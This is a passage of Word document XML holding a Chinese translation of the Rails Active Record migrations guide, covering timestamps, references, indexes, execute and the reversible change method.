        <w:t xml:space="preserve"> 字段，为此，Active Record 提供了一 些捷径：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="06115A7A" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="363A416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create_table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73ECE6C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t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="625F88D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2C8C0E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以上会建立一个新的名为 products 数据表，并包含 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>created_at</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>updated_at</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字段(当然还有id)。 此外：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5DCDCD56" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A9D3BC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change_table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0D0C182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t.timestamps</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2407E44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3B4B5002"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则会在原来的数据表中加入这两个字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5349288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另一个特殊的方法是 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>references</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> （也可以写成 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ）。它最基本的的功能就是 增加可读性。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="6F30E012" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38A5A28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create_table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4559182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t.references :category</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0600FE8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411115B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以上会建立一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>category_id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的字段，并给它一个适当的类型。要注意这里要输入的是model 的名称而不是字段名。Active Record 会自动在model名称的后面加上 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。若你需要用到 多态的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关联时，那么 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>references</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会把两个所需的字段都加进去。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="30FD04DB" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="477BCF9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create_table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73D7F58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t.references :attachment, :polymorphic</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {:default</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'Photo'}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EF3FB5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5B0026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以上会建立一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attachment_id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字段和一个默认值为’Photo’的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attachment_type</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字段。 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>references</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 同时允许你直接定义索引而不用另外在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>add_index</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="2AA3B102" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C58EFC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create_table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7AF36E5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t.references :category, :index</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67DD2A1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4CA639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以上将会创建一个索引，跟 `add_index :products, :category_id` 所做的一样。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435C0EE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references</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 辅助方法实际上不会帮你建立外键约束。你可能需要通过</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>execute</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法 或者用能够加入"外键支持":#7 的插件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB43C0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如果Active Record提供的辅助方法不能满足你的需求，你可以使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>execute</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法来执行任意 的SQL语句。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466F0A3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要想知道各个方法的细节和范例，请参考API文档，特别是关于 </w:t>
      </w:r>
      <w:hyperlink r:id="rId126" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveRecord::ConnectionAdapters::SchemaStatements</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (提供了在</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">中可使用的方法)、 </w:t>
      </w:r>
      <w:hyperlink r:id="rId127" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveRecord::ConnectionAdapters::TableDefinition</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (提供了在</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">所产生的对象中可使用的方法)、以及 </w:t>
      </w:r>
      <w:hyperlink r:id="rId128" w:history="1">
        <w:r w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ActiveRecord::ConnectionAdapters::Table</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (提供了在</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>所产生的对象中可使用的方法)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE8CD7B"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3.5 使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1FC32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在一些情况下，Rails会知道如何去恢复所做的改变，使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法可以让我们不用同 时写</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>down</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法。目前来说</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法只支持以下migration的定义：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8F4082" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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add_column</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AA86AE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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add_index</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FD97AE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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add_timestamps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B0B937" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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create_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BE4601" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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remove_timestamps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9051BB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rename_column</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579C43B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rename_index</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DE4941" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>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rename_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AACF59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如果你需要使用其他方法，那么你就不能使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
